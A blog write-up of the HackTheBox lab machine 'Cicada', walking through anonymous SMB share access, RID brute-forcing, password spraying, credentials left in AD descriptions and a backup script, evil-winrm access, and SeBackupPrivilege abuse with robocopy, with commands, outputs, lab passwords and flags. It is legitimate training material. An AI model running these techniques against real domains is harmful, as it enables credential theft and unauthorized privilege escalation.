---
title: "Cicada"
slug: Cicada
date: 2025-01-02
tags: ["Windows", "AD", "RID-Bruteforce", "SeBackupPrivilege", "AnonymousSession", "netexec", "smbclient", "rpcclient"]
draft: false
---

![Cicada.png](/images/hackthebox/machines/cicada/Cicada.png)

# Summary
1. use anonymous sessions to find txt in HR share
2. use RID-bruteforcing to find usernames
3. password spray password on found user to find valid credentials
4. read AD user info using rpcclient and find new password
5. winrm into the box with new credentials (user)
6. abuse SeBackupPrivilege to escalate to Administrator (root)

---
# Initial Enumeration
As always I start with a port scan using nmap to find running services.

First I find all open ports using a simple port scan: 
```bash
└──╼ [★]$ nmap -p- cicada
...
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
61500/tcp open  unknown          syn-ack ttl 127
...
```

Once I have the open ports I will grab banners for each open port using flag `-sV` and run some scripts using `-sC`  to find as much information as possible.

```bash
└──╼ [★]$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985 -sC -sV cicada
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 14:26 CST
Nmap scan report for cicada (10.129.100.229)
Host is up (1.1s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-30 03:26:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-30T03:26:50
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.59 seconds
```

From the open ports we can clearly see this is a **domain controller**. Why?
let's sum it up:
* `ports 88, 464`: used by Kerberos, an authentication protocol created for Active Directory Environments, typically used by Domain Controllers
* `ports 389, 636, 3268, 3269`: ldap and ldaps services, typically used by domain controllers to query AD objects and attributes.
* `port 53`: DNS, very much needed to translate domain computers to IP addresses. Domain controllers always need this because they will always be authorative zone of an AD environment.

---

# User 

When attacking a domain controller I like to run `enum4linux` because it will do some basic security checks against the Active Directory

let's go
```bash
enum4linux cicada.htb

 =========================================================
|    Domain Information via SMB session for cicada.htb    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: CICADA-DC
NetBIOS domain name: CICADA
DNS domain: cicada.htb
FQDN: CICADA-DC.cicada.htb
Derived membership: domain member
Derived domain: CICADA

 =======================================
|    RPC Session Check on cicada.htb    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'laqmkdmw', password ''
[H] Rerunning enumeration with user 'laqmkdmw' might give more results

 =================================================
|    Domain Information via RPC for cicada.htb    |
 =================================================
[+] Domain: CICADA
[+] Domain SID: S-1-5-21-917908876-1423158569-3159038727
[+] Membership: domain member

 =============================================
|    OS Information via RPC for cicada.htb    |
 =============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: ''
OS build: '20348'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

```

In the RPC Session Check section it states 
```
[+] Server allows session using username 'laqmkdmw', password ''
[H] Rerunning enumeration with user 'laqmkdmw' might give more results
```

so let's do that.

## Abusing anonymous guest access

```bash
enum4linux cicada.htb -u 'randomuser'
```

And indeed I get much more information back. This is a clear indication the domain allows unauthenticated Guest sessions. 
analyzing the ouput it seems that I am able to access a share called "HR"
```bash
 ====================================
|    Shares via RPC on cicada.htb    |
 ====================================
[*] Enumerating shares
[+] Found 7 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
DEV:
  comment: ''
  type: Disk
HR:
  comment: ''
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
NETLOGON:
  comment: Logon server share
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share DEV
[+] Mapping: OK, Listing: DENIED
[*] Testing share HR
[+] Mapping: OK, Listing: OK
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: DENIED
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: DENIED

```

I'll use `smbclient` to access the share.
```bash
#connecting to the share
smbclient //cicada.htb/HR -U 'randomuser'
Password for [WORKGROUP\randomuser]:
Try "help" to get a list of possible commands.
smb: \>

#listing files
smb: \> ls
  .                                   D        0  Thu Mar 14 07:29:09 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 12:31:48 2024

		4168447 blocks of size 4096. 438989 blocks available

#downloading the file the my attacker machine
smb: \> get "Notice from HR.txt" 
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (33.4 KiloBytes/sec) (average 33.4 KiloBytes/sec)
smb: \>
```

In this file we find a password.
```text
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

Now that I have a password, I want to find usernames to I can do a password spray attack and find a valid set of credentials.

## RID-Bruteforce attack 
Since Guest Sessions are allowed, I can try to do a RID brute-force to find valid usernames in the domain.
for this I'll use `netexec`. the follow-up tool in `crackmapexec`.

```bash
netexec smb cicada.htb -u 'randomuser' -p '' --rid-brute
SMB         10.129.227.95   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.95   445    CICADA-DC        [+] cicada.htb\randomuser: (Guest)
SMB         10.129.227.95   445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.227.95   445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.227.95   445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.227.95   445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.227.95   445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.227.95   445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.227.95   445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.227.95   445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.227.95   445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.227.95   445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.227.95   445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.227.95   445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.227.95   445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.227.95   445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.227.95   445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

I'll do some linux magic to get them clean outputted in a file.
```bash
netexec smb cicada.htb -u 'randomuser' -p '' --rid-brute | cut -d ":" -f2 | cut -d " " -f2 > users.txt
```

and now I can use this file for my password spray attack, for this too I will use `netexec`

as we are not interested in Successful Guest logins I'll filter them out
```bash
netexec smb cicada -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success | grep -v '(Guest)'
SMB                      10.129.227.95   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB                      10.129.227.95   445    CICADA-DC        [-] CICADA\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB                      10.129.227.95   445    CICADA-DC        [-] CICADA\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB                      10.129.227.95   445    CICADA-DC        [-] CICADA\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB                      10.129.227.95   445    CICADA-DC        [-] CICADA\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB                      10.129.227.95   445    CICADA-DC        [-] CICADA\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB                      10.129.227.95   445    CICADA-DC        [-] CICADA\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB                      10.129.227.95   445    CICADA-DC        [+] CICADA\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB                      10.129.227.95   445    CICADA-DC        [-] CICADA\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB                      10.129.227.95   445    CICADA-DC        [-] CICADA\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```

With this I have now a working set of credentials:
`michael-wrightson` / `Cicada$M6Corpb*@Lp#nZp!8`

## authenticated LDAP Enumeration for AD
With valid credentials against AD I can read out more information from the Domain Controller and it's database. I'll use `rpcclient` to query some more stuff. 
> You can use enum4linux again with this valid account but I like to use rpcclient manually from time to time.

```bash
rpcclient cicada -U 'michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8'
rpcclient $>
```

now we can query stuff. I'll start by checking info on the users.
```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[john.smoulder] rid:[0x450]
user:[sarah.dantelia] rid:[0x451]
user:[michael.wrightson] rid:[0x452]
user:[david.orelious] rid:[0x454]
user:[emily.oscars] rid:[0x641]
```
 you can check the User object by using the commando `queryuser <username>`

I wrote a small script to automatically check this for all found users:
```bash
for user in $(cat users.txt); do \
rpcclient cicada -U 'michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8' -c "queryuser $user"; \
done
```

> for this small script to work I needed to remove the `CICADA\` prefix from all users.

And it seems that user `david` was stupid enough to put his password in the description of his user object.
```
User Name   :	david.orelious
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Just in case I forget my password is aRt$Lp#7t*VQ!3
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Fri, 15 Mar 2024 01:32:22 CDT
	Logoff Time              :	Wed, 31 Dec 1969 18:00:00 CST
	Kickoff Time             :	Wed, 13 Sep 30828 21:48:05 CDT
	Password last set Time   :	Thu, 14 Mar 2024 07:17:30 CDT
	Password can change Time :	Fri, 15 Mar 2024 07:17:30 CDT
	Password must change Time:	Wed, 13 Sep 30828 21:48:05 CDT
	unknown_2[0..31]...
	user_rid :	0x454
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000002
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
```

new set of credentials:
`david.orelious` / `aRt$Lp#7t*VQ!3`

## More SMB Enumeration

using david's account I enumerated SMB service again and found that we had access to another share: `DEV`

for this enumeration I used `netexec` and `smbclient` again

```bash
#testing access to shares
netexec smb cicada -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.129.227.95   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.95   445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.227.95   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.227.95   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.227.95   445    CICADA-DC        -----           -----------     ------
SMB         10.129.227.95   445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.227.95   445    CICADA-DC        C$                              Default share
SMB         10.129.227.95   445    CICADA-DC        DEV             READ            
SMB         10.129.227.95   445    CICADA-DC        HR              READ            
SMB         10.129.227.95   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.227.95   445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.227.95   445    CICADA-DC        SYSVOL          READ            Logon server share 

#accessing the DEV share
smbclient //cicada/DEV -U david.orelious
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 07:31:39 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 12:28:22 2024

		4168447 blocks of size 4096. 435826 blocks available

#downloading the file
smb: \> get Backup_script.ps1 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (16.3 KiloBytes/sec) (average 16.3 KiloBytes/sec)
smb: \> 
```

In this backup script I found yet another set of credentials
```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

credentials:
`emily.oscars` / `Q!3@Lp#M6b*7t*Vt`

## SMB Enumeration with new credentials
By now you know the drill huh? I check the smb share access again with this new set of credentials but this time I see something interesting
```bash
netexec smb cicada -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --shares
SMB         10.129.227.95   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.95   445    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt 
SMB         10.129.227.95   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.227.95   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.227.95   445    CICADA-DC        -----           -----------     ------
SMB         10.129.227.95   445    CICADA-DC        ADMIN$          READ            Remote Admin
SMB         10.129.227.95   445    CICADA-DC        C$              READ,WRITE      Default share
SMB         10.129.227.95   445    CICADA-DC        DEV                             
SMB         10.129.227.95   445    CICADA-DC        HR              READ            
SMB         10.129.227.95   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.227.95   445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.227.95   445    CICADA-DC        SYSVOL          READ            Logon server share 
```

Emily has permissions on the ADMIN$ and C$ share. This means I could use `PsExec` to gain access shell access to the box.
Instead of using PsExec, I rather use `Evil-Winrm`. 
First let's double check this finding by abusing `netexec` one more time

```bash
netexec winrm cicada -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
WINRM       10.129.227.95   5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.129.227.95   5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

Notice I now used the protocol `winrm` within the `netexec` tool. Winrm stands for Windows remote Management and is achieved by using powershell. `Evil-Winrm` is the Winrm protocol ported to a ruby script with some cool additional features, for Hackers.

let's get into it.

## Winrm access and user flag

```bash
evil-winrm -i cicada -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> 
```

User flag has been achieved
```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> type ../Desktop/user.txt
1b966bb626cf59685b5ce3d22bb3fdfc
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
```

# Root
## Local Privilege Escalation
after looking at the privileges of the current user I noticed we have `SeBackupPrivilege` Enabled
```powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

we can abuse this privilege to backup the SAM Database and grab the administrator hash, wich is cool.
But it can be done easier. we can just backup the root flag and read this file.

let's show you first
```powershell
# Prove that I am Emily
C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars

#go to administrators profile
C:\Users\emily.oscars.CICADA\Documents> cd ../../Administrator/Desktop

#try to read the root file
C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          1/3/2025  10:02 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
Access to the path 'C:\Users\Administrator\Desktop\root.txt' is denied.
At line:1 char:1
+ type root.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

## Abuse the backup privilege

First I will make a temp directory
```powershell
cd /
C:\> mkdir Temp
```

Then I use robocopy with flag `/b` to enable the backup feature and backup the root flag
```
robocopy /b C:\Users\Administrator\Desktop C:\Temp root.txt
```

and now I can read out this backup root flag
```powershell
PS C:\> type C:\Temp\root.txt
1d1bc7246e2b6e329cc5a5e002d78429
```

why? because as Emily, I own this backup file.

Rooted.